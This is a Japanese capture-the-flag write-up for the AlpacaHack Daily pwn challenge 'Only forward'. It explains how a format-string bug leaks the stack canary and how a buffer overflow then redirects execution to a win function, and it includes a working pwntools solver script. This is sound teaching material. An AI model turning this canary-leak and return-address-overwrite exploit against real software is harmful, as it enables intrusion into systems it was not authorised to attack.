---
title: "Only forward - AlpacaHack Daily"
category: "pwn"
subcategory: "stack"
type: "writeup"
tags: ["pwn", "alpacahack", "buffer-overflow", "format-string", "canary", "pie", "checksec", "scanf", "objdump"]
summary: "pwn writeup for \"Only forward\" from AlpacaHack Daily - techniques: alpacahack, buffer-overflow, format-string, canary, pie, checksec, scanf, objdump."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d28_Only_forward/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Only forward"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Only forward
- **Date:** 2026-06-28
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d28_Only_forward>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202606/d28_Only_forward/README.md>

---
# Only forward

## 問題

怯むな。迷わず進め。ただし、奴は起こしてはならん。気をつけろ

```c
void vuln(void) {
    char name[64];
    char buf[64];

    puts("What's your name?");
    read(0, name, 64);

    puts("Hello!");
    printf(name);
    puts("");

    puts("Tell me something:");
    read(0, buf, 256);

    puts("Bye!");
}
```

## 概要

bufのサイズが64バイトであるのに対してread関数で256バイトまで読むことができるので、BOFでvuln関数の戻り先をwin関数に向けられそうな気がします。

しかし、この問題ではスタックカナリアが有効になっており、"奴を起こして"（スタックカナリアを書き換えて）しまうと、スタック破壊が検知されwin関数に飛ぶことができなくなります。

```
$ checksec --file=chal
[*] '/mnt/c/ctf/only-forward/chal'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

```
$ ./chal < payload.bin
What's your name?
Hello!
baumroll1234
Tell me something:
Bye!
*** stack smashing detected ***: terminated
中止 (コアダンプ)
```

どうすればカナリアを起こすことなくこっそりwin関数に飛ばすことができるのでしょうか？

## 方針

nameの読み込み時にFSBを使ってスタックカナリアを盗み見て、bufの読み込み時にその部分が変わらないようなペイロードを作る。

## 解法

nameの読み取り時の
```c
    read(0, name, 64);
```
はサイズ分きっちりまでしか読み取れないので特に問題は無さそうです。

しかし、そのあとの
```c
    printf(name);
```
では、フォーマット部分にユーザー入力をそのまま使ってしまっています。

こうするとその入力に%pなどの書式指定子が含まれていた場合、処理されてしまいます。

これをFSB(Format String Bug)というそうです。

※正しくは、`printf("%s", name);`のようにするべきですよね。

例えば、nameの入力を求められたときに
```
baumroll1234 %p %p %p %p %p %p %p %p
```
と入力したとします。すると、
```
What's your name?
baumroll1234 %p %p %p %p %p %p %p %p
Hello!
baumroll1234 0x7f391a404643 (nil) 0x7f391a31c5a4 0x6 0x7f391a581380 0x6c6c6f726d756162 0x2070252034333231 0x7025207025207025
````

%pの先頭の5つはよくわからないゴミが出て、6つ目以降に`b`(=0x62),`a`(=0x61),`u`(=0x75),...の部分が出ていることがわかります。（あと`%`(=0x25),`p`(=px70)にも注目です。）

これは、関数呼び出し時の引数は全てスタックから取るのではなく、最初の6つはレジスタ$rdi, $rsi, $rdx, $rcx, $r8, $r9から取られるためです。

8個の%pにより9個の引数を要求しているにもかかわらず実際に1個しか渡していないので、8個の%pの分のうち2～6個目はレジスタから取り、残りの3個をスタックから取っているというわけです。

さて、いつものようにアセンブリを見てスタックの構造がどうなるか考えてみましょう。
```
$ objdump -d chal > asm.txt
```

まず、
```
00000000004012a4 <win>:
```
から、win関数のアドレスが0x4012a4であることがわかりました。

PIEは無効になっていることから、このアドレス0x4012a4は固定です。

また、nameとbufの読み取り部分をそれぞれ見てみると、
```
  4013b1:	48 8d 85 70 ff ff ff 	lea    -0x90(%rbp),%rax # nameのアドレス
  4013b8:	ba 40 00 00 00       	mov    $0x40,%edx       # 読み込みサイズ=64
  4013bd:	48 89 c6             	mov    %rax,%rsi
  4013c0:	bf 00 00 00 00       	mov    $0x0,%edi        # 0 (stdin)
  4013c5:	e8 46 fd ff ff       	call   401110 <read@plt>
```
```
  40140b:	48 8d 45 b0          	lea    -0x50(%rbp),%rax # bufのアドレス
  40140f:	ba 00 01 00 00       	mov    $0x100,%edx      # 読み込みサイズ=256
  401414:	48 89 c6             	mov    %rax,%rsi
  401417:	bf 00 00 00 00       	mov    $0x0,%edi        # 0 (stdin)
  40141c:	e8 ef fc ff ff       	call   401110 <read@plt>
```
から、nameはRBP-0x90(=144), bufはRBP-0x50(=80)の位置に配置されることがわかりました。

よって、こんな感じでしょうか？
```
↑高アドレス
----------------------
戻り先アドレス(8)
---------------------- rbp+8
退避ベースポインタ(8)
---------------------- rbp ←ベースポインタ
スタックカナリア (8)
---------------------- rbp-8
パディング (8)
----------------------
buf[63]～[0] (64)
---------------------- rbp-80
name[63]～[0] (64)
---------------------- rbp-144 ←スタックポインタ
↓低アドレス
```
スタックカナリアはnameから見て136バイト上にあります。136は%pの17個分です。

よって、レジスタの5個分＋スタックの17個分＝22個分読み飛ばしてその次の23個目こそが、いま我々がノドから手が出るほど欲しいスタックカナリアの値になります。

試しに2つ余分に25個取得してみましょう
```
What's your name?
%p%p%p%p%p %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p %p %p %p %p
Hello!
0x73c91da04643(nil)0x73c91d91c5a40x60x73c91dba6380 0x70257025702570250x25702570252070250x25702570257025700x25702570257025700x25702570257025700x25207025207025700xa702520702520700x73c91da044e00x7fffadae6fa00x73c91d88848b0x7fffadae71080x1(nil)0x403e000x7fffadae6fc00x40128d (nil) 0x9f38d7eb6559c000 0x7fffadae6fe0 0x40146c
�D��s
```
※read関数は最後にNULLバイトを打ち込まないので最後にゴミが出ていますが無視していいでしょう。

この`0x9f38d7eb6559c000`こそがスタックカナリアということになります。（スタックカナリアの最下位バイトは0x00という決まりがあるので確度が高いですね。）

※この値は毎回変わるので、決め打ちはできません。

また、その2つ先の`0x40146c`はvuln関数の正規の戻り先なので、間違いないでしょう。あとでここも書き換えます。
```
  401467:	e8 18 ff ff ff       	call   401384 <vuln>
  40146c:	b8 00 00 00 00       	mov    $0x0,%eax
```

さて、準備が整ったのでいよいよ戻り先アドレスの書き換えです。

bufを読み取るときに、
```
ダミー(64+8) ＋ 盗み見たスタックカナリアの値(8) ＋ ダミー(8) ＋ win関数のアドレス(8)
```
を送ってあげます。

するとBOF(Buffer OverFlow)によって、スタックカナリアを書き換えることなく戻り先アドレスをwin関数のアドレスに書き換えることができます。

こうすると、スタック破壊検知は、関数の処理が終わって抜けるところで、
```
  401431:	48 8b 45 f8          	mov    -0x8(%rbp),%rax               # スタックカナリアの値を取り出す
  401435:	64 48 2b 04 25 28 00 	sub    %fs:0x28,%rax                 # 正しい値を引いてみる
  40143c:	00 00 
  40143e:	74 05                	je     401445 <vuln+0xc1>            # あっていたら次の★を飛ばす
  401440:	e8 9b fc ff ff       	call   4010e0 <__stack_chk_fail@plt> # ★スタック破壊を検知！
  401445:	c9                   	leave
  401446:	c3                   	ret
```
このようにチェックを行っているため、書き換えたとしても盗み見た値をそのまま書き戻してあげれば、破壊を検知することができません。

カナリアには引き続き寝ていてもらいましょう。

## ソルバー

```py
from pwn import *

io = process('./chal')
#io = remote("34.170.146.252", 17263)

io.sendlineafter(b" name?\n", b"%p" * 22 + b" %p ")

dat = io.recvuntil(b" something:\n").strip()
canary = int(dat.split()[2].decode(), 16)
print(f"{canary = } ({canary:x})")

win_addr = 0x4012a4

payload = b"A" * 72
payload += p64(canary)
payload += b"B" * 8
payload += p64(win_addr)

io.sendline(payload)
print(io.recvall().decode())
```
```
[+] Starting local process './chal': pid 13155
canary = 8065954021376613632 (6ff006727ac95d00)
[+] Receiving all data: Done (39B)
[*] Process './chal' stopped with exit code 0 (pid 13155)
Bye!
Congratulations! Alpaca{REDACTED}
```

## 補足

フラグを取ることはできたものの、2つの疑問が残ったのでここで解決していきます。

### 疑問１：なぜSaved RBPは書き戻さなくて良かったのか？

今回の解答では、退避ベースポインタにはてきとーな値`BBBBBBBB`を入れました。（ちゃんとやろうと思えばもう一つリークさせることでできそうですが。）

すると、vuln関数の最後のleave; ret;のあと、ベースポインタはそのダミーのアドレスに飛んでいってしまいます。
```
↑高アドレス
---------------------- 0x4242424242424242 ←ベースポインタ
・・・
---------------------- ←スタックポインタ
↓低アドレス
```

その後win関数に入り、
```
  4012a8:	55                   	push   %rbp
  4012a9:	48 89 e5             	mov    %rsp,%rbp
  4012ac:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
```
によってfpとflagの領域が確保されると、
```
↑高アドレス
----------------------
ダミーのRBP(0x4242424242424242)
---------------------- rbp ←ベースポインタ
スタックカナリア (8)
---------------------- rbp-8
パディング
----------------------
flag[127]～[0] (128)
---------------------- rbp-144
fp (8)
---------------------- rbp-152
パディング
---------------------- rbp-160 ←スタックポインタ
↓低アドレス
```
このように、ベースポインタがいったん現実世界（？）に戻ってくるので、ダミーのRBPが何であっても大丈夫みたいです。

### 疑問２：なぜアライメント制約にひっかからないのか？

一部の関数は、呼出時にスタックポインタが16の倍数でないと強制終了されてしまいます。

これについては5月6日の過去問「func-array」でも説明されています。

通常はReturnd AddressとSaved RBPはセットで扱われ、ローカル領域についてもパディングで調整が入るので、スタックポインタが16の倍数からズレることはありませんが、今回のようにcallではなくretでむりやり関数に入った場合はズレることがあります。

しかし、win関数内で使われている関数はputs, printf, fopen, fgets, fclose, exitの6種類であり、どれもアライメント違反に寛容な関数であるので、フラグ出力まで正常に完了したものと考えられます。

実際、`fgets(flag, sizeof(flag), fp)`を`fscanf(fp, "%s", flag)`に変えてみると、アライメント制約にひっかかり静かに落ちてしまうのでフラグが出力されませんでした。
